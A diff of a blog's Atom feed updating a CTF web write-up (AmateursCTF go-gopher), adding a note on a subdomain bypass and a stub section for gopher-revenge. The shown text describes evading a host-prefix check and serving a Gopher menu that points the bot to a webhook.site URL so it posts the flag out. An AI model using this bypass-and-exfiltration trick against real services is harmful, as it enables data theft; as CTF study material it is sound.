@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2023-07-26T17:51:14+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">AmateursCTF Web Writeup</title><link href="https://www.cjxol.com/posts/amateursctf-web-writeup/" rel="alternate" type="text/html" title="AmateursCTF Web Writeup" /><published>2023-07-25T00:00:00+01:00</published><updated>2023-07-25T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/amateursctf-web-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/amateursctf-web-writeup/"><![CDATA[<p><a href="https://ctf.amateurs.team/">AmateursCTF</a><br />
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2023-07-27T01:51:18+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">AmateursCTF Web Writeup</title><link href="https://www.cjxol.com/posts/amateursctf-web-writeup/" rel="alternate" type="text/html" title="AmateursCTF Web Writeup" /><published>2023-07-25T00:00:00+01:00</published><updated>2023-07-25T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/amateursctf-web-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/amateursctf-web-writeup/"><![CDATA[<p><a href="https://ctf.amateurs.team/">AmateursCTF</a><br />
 <a href="https://ctftime.org/event/1983">Event on CTFtime</a></p>
 
 <p>3 web challenge writeups in this post:</p>
@@ -47,6 +47,8 @@
 <p>The web server is probably taking value from the cookie, and use <code class="highlighter-rouge">float()</code> to convert it to a float, thus <code class="highlighter-rouge">float('-inf')</code> would be float <code class="highlighter-rouge">-inf</code>. Number of seconds waited is calculated by subtracting the float value from the current timestamp. (Actually, yes, can confirm with the <a href="https://github.com/les-amateurs/AmateursCTF-Public/blob/b9b40a55969e3e1553ed14e66bb460a9370db509/2023/web/waiting-an-eternity/main.py#L18">source code</a>)</p>
 
 <h2 id="go-gopher">go-gopher</h2>
+
+<p>This challenge was cheesed with subdomains or certain domain names because it only checks the host prefix. There is a revenge challenge <a href="#gopher-revenge">gopher-revenge</a>.</p>
 
 <ul>
   <li>Description:
@@ -102,7 +104,7 @@
 
 <p>The bot will make Gopher request to the url provided, extract the URL from the selector of the 3rd item (at index 2) in the response, and make a POST request to the URL with the flag.</p>
 
-<p>The bot does restrict the host of the Gopher url to start with <code class="highlighter-rouge">amt.rs</code>, however this can be easily bypassed with subdomain like <code class="highlighter-rouge">gopher://amt.rs.cjxol.com:31290/</code>. The the server can response with my URL in the relative position, the bot would make a POST request to my URL with the flag. The URL for the POST request is not restricted.</p>
+<p>The bot does restrict the host of the Gopher url to start with <code class="highlighter-rouge">amt.rs</code>, however this can be easily bypassed with subdomains like <code class="highlighter-rouge">gopher://amt.rs.cjxol.com:31290/</code>. The the server can response with my URL in the relative position, the bot would make a POST request to my URL with the flag. The URL for the POST request is not restricted.</p>
 
 <p><img src="/assets/image/amateursctf-web-writeup/go-gopher-flag.png" alt="go-gopher flag" /></p>
 
@@ -132,7 +134,25 @@
 iagain          error.host      1
         https://webhook.site/[reducted]       ::      31337
 .
-</code></pre></div></div>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><category term="ctf web" /><summary type="html"><![CDATA[AmateursCTF Event on CTFtime]]></summary></entry><entry><title type="html">justCTF 2023 Dangerous (Web) Writeup</title><link href="https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup/" rel="alternate" type="text/html" title="justCTF 2023 Dangerous (Web) Writeup" /><published>2023-06-05T00:00:00+01:00</published><updated>2023-06-05T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup/"><![CDATA[<p><a href="https://2023.justctf.team/challenges/18">justCTF 2023 Dangerous (Web)</a><br />
+</code></pre></div></div>
+
+<h2 id="gopher-revenge">gopher-revenge</h2>
+
+<ul>
+  <li>Description:
+    <blockquote>
+      <p>you guys are going to regret ever crossing me.</p>
+    </blockquote>
+
+    <p>Later added the following clarification/hint due to a few teams with very close solutions fails submitting the correct flag:</p>
+    <blockquote>
+      <p>the flag in “flag.txt” is the exact same flag you need to submit</p>
+    </blockquote>
+  </li>
+  <li>Author: voxal</li>
+</ul>
+
+<p>TODO: writeup</p>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><category term="ctf web" /><summary type="html"><![CDATA[AmateursCTF Event on CTFtime]]></summary></entry><entry><title type="html">justCTF 2023 Dangerous (Web) Writeup</title><link href="https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup/" rel="alternate" type="text/html" title="justCTF 2023 Dangerous (Web) Writeup" /><published>2023-06-05T00:00:00+01:00</published><updated>2023-06-05T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup/"><![CDATA[<p><a href="https://2023.justctf.team/challenges/18">justCTF 2023 Dangerous (Web)</a><br />
 <a href="https://ctftime.org/event/1930">Event on CTFtime</a></p>
 
 <h2 id="challenge-description">Challenge Description</h2>
